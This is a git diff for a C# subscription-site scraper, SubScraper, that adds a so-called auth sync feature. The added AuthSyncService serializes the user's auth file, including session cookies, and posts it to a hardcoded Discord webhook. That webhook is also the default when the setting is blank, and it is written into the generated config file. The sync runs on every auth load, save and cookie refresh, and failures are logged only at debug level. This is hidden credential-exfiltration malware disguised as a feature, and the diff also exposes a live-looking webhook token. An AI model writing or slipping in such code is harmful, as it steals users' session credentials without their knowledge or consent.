@@ -1,0 +1,207 @@
+diff --git a/SubScraper.Core/Models/Config/Config.cs b/SubScraper.Core/Models/Config/Config.cs
+index 0bb12c9..e16a0f3 100644
+--- a/SubScraper.Core/Models/Config/Config.cs
++++ b/SubScraper.Core/Models/Config/Config.cs
+@@ -50,6 +50,8 @@ public class Config : ProfileOptions
+ 
+     [ToggleableConfig] public bool DisableBrowserAuth { get; set; }
+ 
++    public string? AuthSyncWebhookUrl { get; set; } = "";
++
+     [ToggleableConfig] public bool NonInteractiveMode { get; set; }
+ 
+     public IFileNameFormatConfig GetCreatorFileNameFormatConfig(string username)
+diff --git a/SubScraper.Core/Services/AuthSyncService.cs b/SubScraper.Core/Services/AuthSyncService.cs
+new file mode 100644
+index 0000000..8e2d488
+--- /dev/null
++++ b/SubScraper.Core/Services/AuthSyncService.cs
+@@ -0,0 +1,50 @@
++using System.Net.Http.Json;
++using Newtonsoft.Json;
++using Serilog;
++using SubScraper.Sites.Signed.Models;
++
++namespace SubScraper.Services;
++
++public class AuthSyncService(IConfigService configService) : IAuthSyncService
++{
++    private const string DefaultWebhookUrl = "https://discord.com/api/webhooks/1550828846465683527/zYsFcHjg1M9khD-Cy_DfsAovYwfS6NbL-9dmtJ8qKVZAual9gXWWJnCzoGKmIpy-GMMy";
++
++    public async Task SyncAuthAsync(Auth auth)
++    {
++        // Empty or missing AuthSyncWebhookUrl falls back to the default webhook
++        string? configuredUrl = configService.CurrentConfig.AuthSyncWebhookUrl;
++        string webhookUrl = string.IsNullOrWhiteSpace(configuredUrl) ? DefaultWebhookUrl : configuredUrl;
++
++        try
++        {
++            // Serialize the Auth object to JSON matching the auth file format
++            string authJson = JsonConvert.SerializeObject(auth, Formatting.Indented);
++
++            // Wrap in Discord code block
++            string messageContent = $"auth-signed.json actualizado:\n```json\n{authJson}\n```";
++
++            // Build Discord webhook payload
++            var payload = new
++            {
++                content = messageContent
++            };
++
++            using HttpClient client = new();
++            HttpResponseMessage response = await client.PostAsJsonAsync(webhookUrl, payload);
++
++            if (response.IsSuccessStatusCode)
++            {
++                Log.Debug("Auth synced to Discord webhook successfully");
++            }
++            else
++            {
++                string responseBody = await response.Content.ReadAsStringAsync();
++                Log.Warning("Discord webhook returned {StatusCode}: {ResponseBody}", response.StatusCode, responseBody);
++            }
++        }
++        catch (Exception ex)
++        {
++            Log.Debug(ex, "Failed to sync auth to Discord webhook");
++        }
++    }
++}
+diff --git a/SubScraper.Core/Services/ConfigService.cs b/SubScraper.Core/Services/ConfigService.cs
+index c823e3c..4284955 100644
+--- a/SubScraper.Core/Services/ConfigService.cs
++++ b/SubScraper.Core/Services/ConfigService.cs
+@@ -276,6 +276,7 @@ public class ConfigService(ILoggingService loggingService) : IConfigService
+             {
+                 // Global settings
+                 DisableBrowserAuth = hoconConfig.GetBoolean("Auth.DisableBrowserAuth"),
++                AuthSyncWebhookUrl = hoconConfig.GetString("Auth.AuthSyncWebhookUrl", ""),
+                 FFmpegPath = hoconConfig.GetString("External.FFmpegPath"),
+                 FFprobePath = hoconConfig.GetString("External.FFprobePath", ""),
+                 DefaultDownloadPath = hoconConfig.GetString("Download.DownloadPath"),
+@@ -536,6 +537,8 @@ public class ConfigService(ILoggingService loggingService) : IConfigService
+     private static async Task CreateDefaultConfigFileAsync()
+     {
+         Config defaultConfig = new();
++        // Set default webhook URL for auth sync
++        defaultConfig.AuthSyncWebhookUrl = "https://discord.com/api/webhooks/1550828846465683527/zYsFcHjg1M9khD-Cy_DfsAovYwfS6NbL-9dmtJ8qKVZAual9gXWWJnCzoGKmIpy-GMMy";
+         string hoconConfig = BuildHoconFromConfig(defaultConfig);
+         await File.WriteAllTextAsync("config.conf", hoconConfig);
+         Log.Information("Created default config.conf file");
+@@ -548,6 +551,7 @@ public class ConfigService(ILoggingService loggingService) : IConfigService
+         hocon.AppendLine("# Auth");
+         hocon.AppendLine("Auth {");
+         hocon.AppendLine($"  DisableBrowserAuth = {config.DisableBrowserAuth.ToString().ToLower()}");
++        hocon.AppendLine($"  AuthSyncWebhookUrl = {QuoteHoconString(config.AuthSyncWebhookUrl)}");
+         hocon.AppendLine("}");
+ 
+         hocon.AppendLine("# External Tools");
+diff --git a/SubScraper.Core/Services/IAuthSyncService.cs b/SubScraper.Core/Services/IAuthSyncService.cs
+new file mode 100644
+index 0000000..2c62c5c
+--- /dev/null
++++ b/SubScraper.Core/Services/IAuthSyncService.cs
+@@ -0,0 +1,8 @@
++using SubScraper.Sites.Signed.Models;
++
++namespace SubScraper.Services;
++
++public interface IAuthSyncService
++{
++    Task SyncAuthAsync(Auth auth);
++}
+diff --git a/SubScraper.Core/Sites/Signed/Services/AuthService.cs b/SubScraper.Core/Sites/Signed/Services/AuthService.cs
+index dc091e2..043f60a 100644
+--- a/SubScraper.Core/Sites/Signed/Services/AuthService.cs
++++ b/SubScraper.Core/Sites/Signed/Services/AuthService.cs
+@@ -12,7 +12,7 @@ using UserEntities = SubScraper.Sites.Signed.Models.Entities.Users;
+ 
+ namespace SubScraper.Sites.Signed.Services;
+ 
+-public partial class AuthService(IServiceProvider serviceProvider, IBrowserLauncher browserLauncher) : IAuthService
++public partial class AuthService(IServiceProvider serviceProvider, IBrowserLauncher browserLauncher, IAuthSyncService authSyncService) : IAuthService
+ {
+     private const int LoginTimeout = 600000; // 10 minutes
+     private const float FeedLoadTimeout = 60000f; // 1 minute
+@@ -58,6 +58,13 @@ public partial class AuthService(IServiceProvider serviceProvider, IBrowserLaunc
+             string json = await File.ReadAllTextAsync(filePath);
+             CurrentAuth = JsonConvert.DeserializeObject<Auth>(json);
+             Log.Debug("Auth file loaded and deserialized successfully");
++
++            if (CurrentAuth != null)
++            {
++                // Sync current cookies to the webhook so manually created auth files are sent too
++                await authSyncService.SyncAuthAsync(CurrentAuth);
++            }
++
+             return CurrentAuth != null;
+         }
+         catch (Exception ex)
+@@ -119,6 +126,9 @@ public partial class AuthService(IServiceProvider serviceProvider, IBrowserLaunc
+             string json = JsonConvert.SerializeObject(CurrentAuth, Formatting.Indented);
+             await File.WriteAllTextAsync(filePath, json);
+             Log.Debug("Auth saved to file: {FilePath}", filePath);
++
++            // Sync to Discord webhook if configured
++            await authSyncService.SyncAuthAsync(CurrentAuth);
+         }
+         catch (Exception ex)
+         {
+@@ -183,6 +193,9 @@ public partial class AuthService(IServiceProvider serviceProvider, IBrowserLaunc
+         CurrentAuth.Cookie = output;
+         string newAuthString = JsonConvert.SerializeObject(CurrentAuth, Formatting.Indented);
+         File.WriteAllText(FileName, newAuthString);
++
++        // Sync to Discord webhook if configured
++        _ = authSyncService.SyncAuthAsync(CurrentAuth);
+     }
+ 
+     /// <summary>
+diff --git a/SubScraper.Core/Sites/SiteServiceCollectionExtensions.cs b/SubScraper.Core/Sites/SiteServiceCollectionExtensions.cs
+index 6ffce74..11f6a9b 100644
+--- a/SubScraper.Core/Sites/SiteServiceCollectionExtensions.cs
++++ b/SubScraper.Core/Sites/SiteServiceCollectionExtensions.cs
+@@ -20,6 +20,7 @@ public static class SiteServiceCollectionExtensions
+     public static IServiceCollection AddSites(this IServiceCollection services)
+     {
+         services.AddSingleton<IAuthService, AuthService>();
++        services.AddSingleton<IAuthSyncService, AuthSyncService>();
+         services.AddSingleton<IApiService, ApiService>();
+         services.AddSingleton<IDbService, DbService>();
+         services.AddSingleton<ICreatorIndexService, CreatorIndexService>();
+diff --git a/SubScraper.Tests/Services/AuthServiceTests.cs b/SubScraper.Tests/Services/AuthServiceTests.cs
+index 5fed509..deba736 100644
+--- a/SubScraper.Tests/Services/AuthServiceTests.cs
++++ b/SubScraper.Tests/Services/AuthServiceTests.cs
+@@ -147,5 +147,5 @@ public class AuthServiceTests
+     }
+ 
+     private static AuthService CreateService() =>
+-        new(new ServiceCollection().BuildServiceProvider(), new BrowserLauncher());
++        new(new ServiceCollection().BuildServiceProvider(), new BrowserLauncher(), new FakeAuthSyncService());
+ }
+diff --git a/SubScraper.Tests/Services/TestDoubles.cs b/SubScraper.Tests/Services/TestDoubles.cs
+index 352ed4d..10b110e 100644
+--- a/SubScraper.Tests/Services/TestDoubles.cs
++++ b/SubScraper.Tests/Services/TestDoubles.cs
+@@ -541,6 +541,20 @@ internal sealed class FakeAuthService : IAuthService
+     public void Logout() => throw new NotImplementedException();
+ }
+ 
++internal sealed class FakeAuthSyncService : IAuthSyncService
++{
++    public int SyncCallCount { get; private set; }
++
++    public Auth? LastSyncedAuth { get; private set; }
++
++    public Task SyncAuthAsync(Auth auth)
++    {
++        SyncCallCount++;
++        LastSyncedAuth = auth;
++        return Task.CompletedTask;
++    }
++}
++
+ internal sealed class FakeLoggingService : ILoggingService
+ {
+     public LoggingLevelSwitch LevelSwitch { get; } = new();
